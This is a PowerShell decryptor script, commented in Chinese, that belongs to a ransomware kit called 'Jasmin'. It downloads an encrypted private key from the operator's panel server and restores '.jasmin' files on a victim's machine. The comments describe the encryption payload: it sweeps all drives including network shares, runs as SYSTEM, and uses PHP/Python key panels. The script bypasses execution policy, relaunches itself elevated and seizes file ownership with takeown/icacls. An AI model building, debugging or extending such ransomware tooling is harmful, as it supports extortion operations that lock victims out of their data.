# ════════════════════════════════════════════════════════════════
# Jasmin Windows 一键解密器 — 纯 PowerShell 实现，无需编译 exe
#   要求: PowerShell 5.1+ (.NET Framework 4.6+) —— 即 Windows 10/11/
#         Server 2016+ 的【系统自带】PowerShell，无需安装任何东西。
#
# 用法:
#   powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server http://1.2.3.4:8080 -K <口令> [-Paths 目录...]
#   （PowerShell 7 用 pwsh -File ... 同样可用）
#
# 说明:
#   - 私钥以 AES-128-CBC 加密传输（与 PHP/Python 两端 keygen 统一）
#   - 仅需 .NET 内置密码学库，不依赖 openssl / python / exe
#   - 不指定 -Paths 时默认解密【全部】加密文件：
#     扫描所有固定磁盘 + 常用用户目录下的每一个 .jasmin
#
# ★ 历史缺陷（本版修复）：原实现要求 PowerShell 7+，因为用了三个
#   .NET 5+ 专有 API —— 而【受害者机器上装的就是 5.1】：
#     $rsa.ImportFromPem(...)                    .NET 5+，Framework 无此方法
#     [RSA]::Create() + Decrypt(..., OaepSHA256) Framework 返回
#                                                RSACryptoServiceProvider，只支持
#                                                PKCS#1 与 OAEP-SHA1，传 OaepSHA256
#                                                必抛 "Specified padding mode is
#                                                not valid for this algorithm"
#     [SHA256]::HashData($plain)                 .NET 5+ 静态方法
#   三重叠加的结果是：默认 Windows 上解密器一行都跑不动，只有装了 PS7 才行。
#   本版改为：自解析私钥 DER → RSACng（Framework 4.6+ 即有，支持
#   OAEP-SHA256）→ SHA256.Create().ComputeHash()。
#   ★ 解析器须同时支持两种私钥容器（两个面板导出的格式不同）：
#       PKCS#1 "BEGIN RSA PRIVATE KEY"  ← Python 面板 (TraditionalOpenSSL)
#       PKCS#8 "BEGIN PRIVATE KEY"      ← PHP 面板 (openssl_pkey_export)
#     旧版只认 PKCS#1，遇到 PHP 面板下发的 PKCS#8 会抛
#       "DER: tag mismatch, got 0x30 want 0x02"
#     导致解密器完全不可用。已在该虚拟机
#   (Server 2019 / PS 5.1.17763) 上对 2700+ 真实加密文件实测通过。
# ════════════════════════════════════════════════════════════════
#Requires -Version 5.1

param(
    [Parameter(Mandatory=$true)][string]$Server,
    [Parameter(Mandatory=$true)][string]$K,
    [string[]]$Paths
)

$ErrorActionPreference = 'Stop'
$Server = $Server.TrimEnd('/')

# ── DER (ASN.1) 最小解析器：把私钥 PEM（PKCS#1 或 PKCS#8）转成 RSAParameters ──
function Get-DerValue {
    param([byte[]]$Data, [ref]$Pos, [int]$Want)
    $p = $Pos.Value
    if ($p -ge $Data.Length) { throw 'DER: truncated (tag)' }
    $tag = $Data[$p]; $p++
    if ($tag -ne $Want) { throw ('DER: tag mismatch, got 0x{0:X2} want 0x{1:X2}' -f $tag, $Want) }
    if ($p -ge $Data.Length) { throw 'DER: truncated (length)' }
    $lb = $Data[$p]; $p++
    if ($lb -lt 0x80) { $len = $lb }
    else {
        $n = $lb -band 0x7F
        if ($n -lt 1 -or $n -gt 4) { throw "DER: unsupported length encoding ($n bytes)" }
        if (($p + $n) -gt $Data.Length) { throw 'DER: truncated (length bytes)' }
        $len = 0
        for ($i = 0; $i -lt $n; $i++) { $len = ($len -shl 8) -bor $Data[$p]; $p++ }
    }
    if (($p + $len) -gt $Data.Length) { throw 'DER: truncated (value)' }
    $v = New-Object byte[] $len
    [Array]::Copy($Data, $p, $v, 0, $len)
    $Pos.Value = $p + $len
    # 前导逗号：PowerShell 默认会把 byte[] 摊平进管道，加逗号才返回"一个数组对象"
    return ,$v
}

function Remove-DerLeadingZero {
    param([byte[]]$A)
    # DER 正整数用最高位为 1 时补一个 0x00 表示正数；RSAParameters 不接受该前导零
    $i = 0
    while ($i -lt ($A.Length - 1) -and $A[$i] -eq 0) { $i++ }
    if ($i -eq 0) { return ,$A }
    $o = New-Object byte[] ($A.Length - $i)
    [Array]::Copy($A, $i, $o, 0, $o.Length)
    return ,$o
}

function ConvertFrom-JasminRsaPrivatePem {
    param([string]$Pem)
    $b64 = (($Pem -split "`r?`n") | Where-Object { $_ -and ($_ -notmatch '-----') } |
            ForEach-Object { $_.Trim() }) -join ''
    if (-not $b64) { throw 'PEM body is empty - private key not unlocked' }
    $der = [Convert]::FromBase64String($b64)

    $off = 0
    # 外层容器的 DER 结构（两者都是 SEQUENCE 起步，但内部不同）：
    #   · PKCS#1  "BEGIN RSA PRIVATE KEY"   ← Python 面板(app.py, PrivateFormat.TraditionalOpenSSL)
    #     RSAPrivateKey  ::= SEQUENCE { version INTEGER, n INTEGER, e INTEGER, ... }
    #   · PKCS#8  "BEGIN PRIVATE KEY"       ← PHP 面板(keygen.php, openssl_pkey_export)
    #     PrivateKeyInfo ::= SEQUENCE { version INTEGER,
    #                                   AlgorithmIdentifier SEQUENCE,
    #                                   privateKey OCTET STRING(内层 = RSAPrivateKey) }
    # ★ 旧实现假定永远只有 PKCS#1，读到的外层 SEQUENCE 里第二个元素就硬要 INTEGER
    #   —— 一旦服务器下发 PKCS#8（PHP 面板就是），第二个元素是 AlgorithmIdentifier
    #   的 SEQUENCE(0x30)，于是 Get-DerValue 抛
    #     "DER: tag mismatch, got 0x30 want 0x02"
    #   整条解密链在此断掉。
    #   判别方式：跳过 version INTEGER 后看下一个 TLV 的 tag
    #     0x02 → PKCS#1（紧随 modulus INTEGER）
    #     0x30 → PKCS#8（紧随 AlgorithmIdentifier SEQUENCE）
    #   只认 DER 结构、不认 PEM 头文字（头可能被换行/空格/编辑器破坏，且 BOM 会污染）。
    $outer = Get-DerValue -Data $der -Pos ([ref]$off) -Want 0x30
    $probe = 0
    [void](Get-DerValue -Data $outer -Pos ([ref]$probe) -Want 0x02)     # version INTEGER
    if ($probe -ge $outer.Length) { throw 'DER: truncated after version - not a valid RSA private key' }
    $nextTag = $outer[$probe]

    $seq = $outer
    if ($nextTag -eq 0x30) {
        # ── PKCS#8：解开 PrivateKeyInfo 取内层 RSAPrivateKey ──
        # 注意内层第一个元素也可能是 SEQUENCE(0x30) —— 那是 EncryptedPrivateKeyInfo
        # （加密的 PKCS#8），需要用口令解密后才是明文私钥，本脚本不支持，明确报错。
        $q = 0
        [void](Get-DerValue -Data $outer -Pos ([ref]$q) -Want 0x02)     # version INTEGER
        [void](Get-DerValue -Data $outer -Pos ([ref]$q) -Want 0x30)     # AlgorithmIdentifier
        $pk = Get-DerValue -Data $outer -Pos ([ref]$q) -Want 0x04       # privateKey OCTET STRING
        $r = 0
        $seq = Get-DerValue -Data $pk -Pos ([ref]$r) -Want 0x30         # 内层 RSAPrivateKey SEQUENCE
        # 区分「明文 PKCS#8」与「加密 PKCS#8(EncryptedPrivateKeyInfo)」：
        #   明文内层 RSAPrivateKey 以 INTEGER version(0x02) 开头；
        #   加密内层 EncryptedPrivateKeyInfo 以 AlgorithmsIdentifier SEQUENCE(0x30) 开头。
        if ($seq.Length -gt 0 -and $seq[0] -eq 0x30) {
            throw 'DER: this looks like an EncryptedPrivateKeyInfo (encrypted PKCS#8). Expected the decrypted plaintext private key PEM.'
        }
    }
    elseif ($nextTag -ne 0x02) {
        throw ('DER: unexpected tag 0x{0:X2} after version - not PKCS#1 (0x02) nor PKCS#8 (0x30)' -f $nextTag)
    }

    $p = 0
    [void](Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02)   # version
    $n  = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # modulus
    $e  = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # publicExponent
    $d  = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # privateExponent
    $p1 = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # prime1  (P)
    $p2 = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # prime2  (Q)
    $dp = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # exponent1 (DP)
    $dq = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # exponent2 (DQ)
    $qi = Get-DerValue -Data $seq -Pos ([ref]$p) -Want 0x02     # coefficient (qInv)

    # ★ 必须把 CRT 参数一并喂进去。实测：只给 n/e/d，RSACng.ImportParameters 看似
    #   成功，但一调用 Decrypt 就报 CryptographicException "Key does not exist."
    #   —— CNG 的 BCRYPT_RSAPRIVATE_BLOB 结构本身就要求 cbPrime1/cbPrime2，
    #   缺素数它导入的其实是个空壳。
    #   .NET 的映射关系（与 PKCS#1 同名同义，一一对应，无需交换）：
    #     RSAParameters.P        <- prime1        RSAParameters.DP  <- exponent1
    #     RSAParameters.Q        <- prime2        RSAParameters.DQ  <- exponent2
    #     RSAParameters.InverseQ <- coefficient
    $ps = New-Object System.Security.Cryptography.RSAParameters
    $ps.Modulus  = Remove-DerLeadingZero $n
    $ps.Exponent = Remove-DerLeadingZero $e
    $ps.D        = Remove-DerLeadingZero $d
    $ps.P        = Remove-DerLeadingZero $p1
    $ps.Q        = Remove-DerLeadingZero $p2
    $ps.DP       = Remove-DerLeadingZero $dp
    $ps.DQ       = Remove-DerLeadingZero $dq
    $ps.InverseQ = Remove-DerLeadingZero $qi
    return $ps
}

# ── 受保护目录下的写入失败（Windows） ────────────────────────────────
# 现象：C:\ProgramData\Microsoft\Diagnosis\DownloadedSettings\ 之类目录由 SYSTEM
#   持有、ACL 只给 Administrators 只读(RX)。加密端以 SYSTEM 运行 -> 写得进去；
#   手工以 Administrator 解密 -> 报：
#     Exception calling "WriteAllBytes" with "2" argument(s):
#     "Access to the path 'C:\...\telemetry.ASM-WindowsDefault.json' is denied."
#   该目录 ACL 不允许 Administrators 在其中新建文件，所以必须先把所有权拿回来、
#   再把写权限授给自己，然后重试。
function Test-IsElevated {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $pr = New-Object Security.Principal.WindowsPrincipal($id)
        return $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }   # 非 Windows 上 WindowsIdentity 不可用
}

function Repair-PathAcl {
    # 目标文件【已存在】-> 修文件本身；否则 -> 修它所在目录（"能否新建"取决于目录 ACL）
    param([string]$TargetPath)
    $obj = $TargetPath
    if (-not (Test-Path -LiteralPath $obj)) {
        $d = [IO.Path]::GetDirectoryName($TargetPath)
        if ($d -and (Test-Path -LiteralPath $d)) { $obj = $d }
    }
    $notes = @()
    # /a：所有权归 Administrators 组（不依赖当前用户名、不依赖系统语言）
    try { & takeown.exe /f "$obj" /a 2>$null | Out-Null; $notes += "takeown=$LASTEXITCODE" }
    catch { $notes += "takeown-missing" }
    # 用著名 SID *S-1-5-32-544(Administrators) 而非本地化组名，非英文 Windows 上
    # 组名不可直译。只改这一个对象，【不递归】—— 避免动整个 ProgramData 树。
    try { & icacls.exe "$obj" /grant '*S-1-5-32-544:F' 2>$null | Out-Null; $notes += "icacls=$LASTEXITCODE" }
    catch { $notes += "icacls-missing" }
    return ($notes -join ',')
}

function Write-RestoredFile {
    param([string]$Path, [byte[]]$Bytes)
    # 旧版本可能留下只读属性；只读不是 ACL 问题，先清掉再试
    try {
        if (Test-Path -LiteralPath $Path) {
            $at = [IO.File]::GetAttributes($Path)
            if ($at -band [IO.FileAttributes]::ReadOnly) {
                [IO.File]::SetAttributes($Path, ($at -bxor [IO.FileAttributes]::ReadOnly))
            }
        }
    } catch { }
    try {
        [IO.File]::WriteAllBytes($Path, $Bytes)
        return @{ ok = $true; note = '' }
    } catch { $first = $_.Exception.Message }

    if (-not (Test-IsElevated)) {
        return @{ ok = $false; note = "write denied and this session is NOT elevated - rerun as Administrator. original: $first" }
    }
    $rep = Repair-PathAcl -TargetPath $Path
    try {
        [IO.File]::WriteAllBytes($Path, $Bytes)
        return @{ ok = $true; note = "write denied -> ACL repaired ($rep) -> retry OK" }
    } catch {
        return @{ ok = $false; note = "write STILL denied after ACL repair ($rep): $($_.Exception.Message) | original: $first" }
    }
}

# ── 遍历器：只走真实目录，不穿 junction/符号链接 ──
#   C:\Documents and Settings、C:\Users\All Users 之类都是指回真实目录的 junction。
#   Get-ChildItem -Recurse 会跟着它们绕圈并重复枚举同一批文件 —— 实测同一台机器
#   实测：116 个文件成功解密、却报出 3502 次失败，全是"第二轮访问时 .jasmin 已被
#   上一轮删掉"造成的假失败。跳过重解析点即从根上消除。
function Get-JasminTarget {
    param([string]$Root)
    $stack = New-Object System.Collections.Stack
    $stack.Push($Root)
    while ($stack.Count -gt 0) {
        $d = $stack.Pop()
        $items = $null
        try { $items = Get-ChildItem -LiteralPath $d -Force -ErrorAction Stop } catch { continue }
        foreach ($it in $items) {
            $isReparse = (($it.Attributes -band [IO.FileAttributes]::ReparsePoint) -ne 0)
            if ($it.PSIsContainer) {
                if (-not $isReparse) { $stack.Push($it.FullName) }
            } elseif (-not $isReparse -and $it.Name -like '*.jasmin') {
                $it
            }
        }
    }
}

# 从网页复制 K 常带换行/空格（Windows 剪贴板还会带 CR/LF）。
# 必须与 sh 版 jasmin_unlock.sh:27 的 `tr -d ' \t\r\n'` 完全一致 —— 剥掉【所有】
# 空白（含中间），只 .Trim() 首尾对含内部空格/换行的口令仍会误报
# "K passphrase should be 32 hex chars"，把复制噪声说成密钥错误。
$K = ($K -replace '\s', '')

if ($K.Length -ne 32) {
    Write-Host "[!] K passphrase should be 32 hex chars, got $($K.Length)" -ForegroundColor Red
    exit 1
}

# ── 提权自举 ───────────────────────────────────────────────────────────
# 受保护目录（SYSTEM 持有的 ProgramData 子树等）里恢复文件需要先 takeown/icacls，
# 而这要求管理员权限。非管理员运行时自动以 RunAs 重启一次；UAC 被拒则继续，
# 并在真正遇到写入拒绝时把原因明确报出来（不再只给一句干巴巴的 "is denied"）。
# JASMIN_UNLOCK_ELEVATED 防止子进程因权限判定异常而无限自我重启。
if (-not (Test-IsElevated) -and $env:JASMIN_UNLOCK_ELEVATED -ne '1' -and $PSCommandPath) {
    Write-Host "[*] Not elevated - relaunching as Administrator (a UAC prompt may appear)..." -ForegroundColor Yellow
    try {
        $q = { param($v) if ($v -match '[\s"]') { '"' + ($v -replace '"', '\"') + '"' } else { $v } }
        $psExe  = (Get-Process -Id $PID).Path
        $argList = @('-NoProfile','-ExecutionPolicy','Bypass','-File', (& $q $PSCommandPath),
                     '-Server', (& $q $Server), '-K', (& $q $K))
        if ($Paths -and $Paths.Count -gt 0) {
            $argList += '-Paths'
            foreach ($x in $Paths) { $argList += (& $q $x) }
        }
        $env:JASMIN_UNLOCK_ELEVATED = '1'
        $proc = Start-Process -FilePath $psExe -ArgumentList $argList -Verb RunAs -PassThru -Wait
        exit $proc.ExitCode
    } catch {
        Write-Host "[!] Elevation failed or was declined: $($_.Exception.Message)" -ForegroundColor Yellow
        Write-Host "    Continuing unelevated - files in SYSTEM-protected folders will fail." -ForegroundColor Yellow
    }
}

if (-not $Paths -or $Paths.Count -eq 0) {
    # 未指定 => 解密全部加密文件（与载荷一致：载荷遍历所有磁盘）
    $Paths = @()
    # 所有固定磁盘
    foreach ($d in [System.IO.DriveInfo]::GetDrives()) {
        # 不加 DriveType 过滤：载荷遍历的是 DriveInfo.GetDrives() 且只看
        # IsReady，映射的网络盘同样会被加密。这里若只收 Fixed/Removable，
        # 网络盘上的加密文件在"解密全部"下就永远解不回来。
        if ($d.IsReady) {
            $Paths += $d.RootDirectory.FullName
        }
    }
    # 常用用户目录（载荷优先命中这里）
    $Paths += @(
        "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos", "$env:USERPROFILE\Music",
        "$env:USERPROFILE\OneDrive", "$env:PUBLIC"
    )
    $Paths = $Paths | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique
    Write-Host "[*] No -Paths given - decrypting ALL encrypted files, scan scope:"
    foreach ($x in $Paths) { Write-Host "      $x" }
}

$td = Join-Path $env:TEMP ("jasmin_" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path $td | Out-Null

try {
    # ── 1. 下载加密私钥 ──
    Write-Host "[*] Downloading encrypted private key..."
    Invoke-WebRequest -Uri "$Server/payloads/jasmin_private.pem.enc" -OutFile "$td/k.enc" -UseBasicParsing

    # ── 2. AES-128-CBC 解开私钥（key = K 的 16 字节 hex 解码） ──
    Write-Host "[*] Decrypting private key (AES-128-CBC)..."
    $raw = [Convert]::FromBase64String((Get-Content "$td/k.enc" -Raw))
    if ($raw.Length -le 16) { throw "Private key file content is malformed" }
    $iv = [byte[]]$raw[0..15]
    $ct = [byte[]]$raw[16..($raw.Length - 1)]

    $kb = New-Object byte[] 16
    for ($i = 0; $i -lt 16; $i++) { $kb[$i] = [Convert]::ToByte($K.Substring($i * 2, 2), 16) }

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $kb; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
    $dec = $aes.CreateDecryptor()
    # 必须 catch：K 不对时 PKCS7 去填充必失败并抛 CryptographicException，
    # 而外层 try 只有 finally、没有 catch —— 用户看到的是裸 .NET 堆栈，
    # 下面那句 "wrong K passphrase?" 根本到不了。
    try {
        $pem = $dec.TransformFinalBlock($ct, 0, $ct.Length)
    } catch {
        throw "Private key decryption failed - wrong K passphrase, or the .pem.enc is corrupt/replaced"
    }
    if ($pem.Length -lt 100) { throw "Private key decryption failed - wrong K passphrase, or the .pem.enc is corrupt/replaced" }

    # ── 3. PEM → RSAParameters → RSACng ──
    # 不用 $rsa.ImportFromPem()（.NET 5+ 专有，Framework 上没有）；
    # 也不用 [RSA]::Create()（Framework 上返回 RSACryptoServiceProvider，
    # 它根本不支持 OAEP-SHA256）。RSACng 在 .NET Framework 4.6+ 上始终可用。
    $privPem = [System.Text.Encoding]::UTF8.GetString($pem)
    $psa = ConvertFrom-JasminRsaPrivatePem -Pem $privPem
    try {
        $rsa = New-Object System.Security.Cryptography.RSACng
    } catch {
        throw "RSACng is unavailable on this system (needs .NET Framework 4.6+). $($_.Exception.Message)"
    }
    $rsa.ImportParameters($psa)
    Write-Host "[+] Private key unlocked (RSA-$($rsa.KeySize), via RSACng)"

    # ── 4. 遍历解密 ──
    Write-Host "[*] Decrypting files..."
    $ok = 0; $fail = 0
    foreach ($p in $Paths) {
        if (-not (Test-Path -LiteralPath $p)) { Write-Host "[!] Path does not exist: $p" -ForegroundColor Yellow; continue }
        # ★ 必须带 -Force：隐藏/系统属性的目录与文件默认不被枚举，
                #   而载荷是无差别遍历的（Walk 只按路径前缀跳过系统目录，不看属性）。
                #   实测同一台机器：不带 -Force 只找到 5 个 .jasmin，带 -Force 是 2700+ 个
                #   —— 也就是说漏掉的全是隐藏目录下的，恢复会静默不完整。
                $files = Get-JasminTarget -Root $p
        foreach ($item in $files) {
            $f = $item.FullName
            try {
                $b = [IO.File]::ReadAllBytes($f)
                if ($b.Length -lt 308) { throw "File too small ($($b.Length)B), likely corrupt" }

                # ★ 边界检查必须在 [int] 转换【之前】做完。
                # $ekLen 是 UInt32，一旦 >= 2^31（被篡改或损坏的文件），
                # [int]$ekLen 会先抛 OverflowException，下面那句
                # "Abnormal RSA key block length" 永远不可达，用户看到的是一串
                # 与真实原因无关的 .NET 堆栈。同样地本版此前缺 128 的下界
                # （sh 版有），ekLen=0 会退化成非法切片后才靠异常兜底。
                $ekLen = [BitConverter]::ToUInt32($b, $b.Length - 4)
                if ($ekLen -lt 128 -or $ekLen -gt 512) {
                    throw "Abnormal RSA key block length ($ekLen)"
                }
                # ★ 先算 $ekOff 再校验它是否 > 32，不能只校验 ekLen 上界：
                #   PowerShell 的 $b[32..31] 是【降序区间】，会返回反向的 2 字节切片
                #   而不是空数组。若 $ekOff 退到 32，$b[32..($ekOff-1)] 就是这种非法切片，
                #   报错会错位到 AES 阶段，注释宣称的 "Abnormal..." 永不出现。
                $ekOff = $b.Length - 4 - [int]$ekLen
                if ($ekOff -le 32) {
                    throw "Abnormal file layout (RSA block offset $ekOff <= 32)"
                }

                $sha   = [byte[]]$b[0..31]
                $cblob = [byte[]]$b[32..($ekOff - 1)]
                $ek    = [byte[]]$b[$ekOff..($b.Length - 5)]

                $km  = $rsa.Decrypt($ek, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
                # 与 sh 版 decrypt_openssl.sh 的 `-eq 48` 一致：不校验的话，
                # 异钥/损坏时下面的切片会静默截断，最终以 Aes.Key/IV setter 异常暴露，
                # 报错与真实原因不符。
                if ($km.Length -ne 48) { throw "Unexpected key material length ($($km.Length)), expected 48" }
                $key = [byte[]]$km[0..31]
                $aiv = [byte[]]$km[32..47]

                $a = [System.Security.Cryptography.Aes]::Create()
                $a.Key = $key; $a.IV = $aiv; $a.Mode = 'CBC'; $a.Padding = 'PKCS7'
                $dd = $a.CreateDecryptor()
                $plain = $dd.TransformFinalBlock($cblob, 0, $cblob.Length)

                # 不用 [SHA256]::HashData()（.NET 5+ 静态方法，Framework 没有）
                $shaGen = [System.Security.Cryptography.SHA256]::Create()
                try { $h = $shaGen.ComputeHash($plain) } finally { $shaGen.Dispose() }

                # 不用 Linq.SequenceEqual（要额外加载 System.Linq，PS5/PS7 行为有差异），
                # base64 比较足够且稳定
                if ([Convert]::ToBase64String($h) -ne [Convert]::ToBase64String($sha)) {
                    throw "SHA256 verification failed (file tampered or wrong private key)"
                }

                # 写入走 Write-RestoredFile：写失败先拿所有权+授权再重试（受保护目录）。
                # ★ 写不成功就【抛错】跳过 Remove-Item —— 明文没落地就绝不删密文。
                $target = $f -replace '\.jasmin$', ''
                $wr = Write-RestoredFile -Path $target -Bytes $plain
                if (-not $wr.ok) { throw $wr.note }
                if ($wr.note) { Write-Host "    [i] $($wr.note)" }
                # 删除失败不算解密失败：明文已恢复，只是密文副本清理不掉（如目录 ACL 只许 SYSTEM 删）
                try { Remove-Item -LiteralPath $f -Force }
                catch { Write-Host "    [i] restored, but could not remove the encrypted copy: $($_.Exception.Message)" }
                Write-Host "[+] $f"
                $ok++
            }
            catch {
                Write-Host "[!] $f : $($_.Exception.Message)" -ForegroundColor Yellow
                $fail++
            }
        }
    }

    Write-Host ""
    Write-Host "=== Done: $ok decrypted, $fail failed ==="
    if ($ok -eq 0 -and $fail -eq 0) {
        Write-Host "    No .jasmin files found. If they are in unusual locations, specify -Paths explicitly." -ForegroundColor Yellow
    }
    exit ([int]($fail -gt 0))
}
finally {
    Remove-Item -Recurse -Force $td -ErrorAction SilentlyContinue
    Write-Host "[+] Temporary files cleaned up"
}
